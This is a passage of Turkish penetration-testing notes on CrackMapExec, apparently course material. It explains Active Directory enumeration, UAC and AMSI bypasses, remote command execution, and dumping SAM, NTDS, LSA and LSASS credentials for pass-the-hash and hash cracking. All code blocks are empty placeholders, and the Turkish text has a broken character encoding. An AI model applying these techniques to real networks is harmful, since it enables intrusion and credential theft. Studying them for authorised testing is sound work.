HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


